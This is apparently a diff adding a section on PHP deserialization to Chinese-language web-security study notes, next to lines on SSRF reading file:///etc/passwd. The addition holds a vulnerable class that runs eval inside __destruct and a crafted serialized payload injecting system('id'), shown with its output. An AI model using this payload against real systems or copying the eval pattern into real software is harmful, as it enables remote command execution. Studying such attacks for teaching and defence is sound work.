@@ -83,6 +83,42 @@ $(document).ready(function(){
 1. 请求非http协议, 读取本地文件, 如: `file:///etc/passwd`。
 1. 间接获取内置帐号token。
 
+## 反序列化
+
+```php
+<?php
+// 定义类
+class Cl{
+    var $test = "hello";
+    var $age = 3;
+
+    // magic函数会被自动调用
+    // 命名是以符号开头的，比如 __construct, __destruct, __toString, __sleep, __wakeup
+    function __destruct(){
+        // 序列化调用一次, 反序列化调用一次
+        echo $this->test;
+        // 注入点
+        eval("$this->test");
+    }
+}
+$c = new Cl();
+// 序列化
+$sc = serialize($c);
+// object:类名长度:类名:属性数量:{s属性类型字符串:属性名称;s属性类型字符串:属性值;s属性类型字符串:属性名称;i属性类型整型:属性值}
+// O:1:"C":1:{s:4:"test";s:5:"hello";}
+// O:2:"Cl":1:{s:4:"test";s:5:"hello";}
+// O:2:"Cl":2:{s:4:"test";s:5:"hello";s:3:"age";i:3;}
+print_r($sc);
+echo "<br>";
+// 反序列化
+$sc = 'O:2:"Cl":2:{s:4:"test";s:13:"system(\'id\');";s:3:"age";i:3;}';
+// uid=1(daemon) gid=1(daemon) groups=1(daemon)
+$uc = unserialize($sc);
+// hello
+print_r($uc->test);
+?>
+```
+
 ## SQL注入
 
 ### 注释
